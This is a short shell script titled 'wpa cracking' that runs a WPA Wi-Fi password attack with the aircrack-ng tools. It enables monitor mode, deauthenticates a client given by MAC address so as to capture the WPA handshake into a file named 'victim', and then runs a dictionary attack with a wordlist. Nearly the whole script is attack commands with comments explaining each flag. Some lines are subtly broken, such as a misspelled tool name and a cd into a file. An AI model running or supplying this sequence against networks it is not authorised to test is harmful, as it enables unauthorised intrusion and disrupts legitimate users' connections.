#!/bin/sh

#----------------------------------------------------------------------------------------#
#	wpa cracking  #
#----------------------------------------------------------------------------------------#

ifconfig wlan0 up

# put card into monitor mode
airmon-ng start wlan0

# get channel, bssid
airodump-ng mon0

# stop monitor mode and start on channel your attacking
airmon-ng stop mon0

# start monitor mode on channel 11
airmon-ng start wlan0 11

# defauth client on the network to get the 4 way handshake
airplay-ng -0 30 -a 00:09:5B:FF:4F:B6 -c 00:22:69:08:70:11 wlan0

# -0 = deauth attack
# 30 = number of deauth packets
# -a 00:09:5B:FF:4F:B6 = the bssid of the wifi network
# -c 00:22:69:08:70:11 = address of client on the network
# wlan0 = our network interface


# run airodump
airodump-ng -c 11 --bssid 00:09:5B:FF:4F:B6 -w victim wlan0

# -c = channel
# --bssid = bssid of the network we found
# -w = write the file out to victim
# wlan0 = our network interface


# dictionary attack
cd /pentest/passwords/wordlists/darkc0de.lst

aircrack-ng victim*.cap -w /pentest/passwords/wordlists/darkc0de.lst 

# then select the network in the terminal
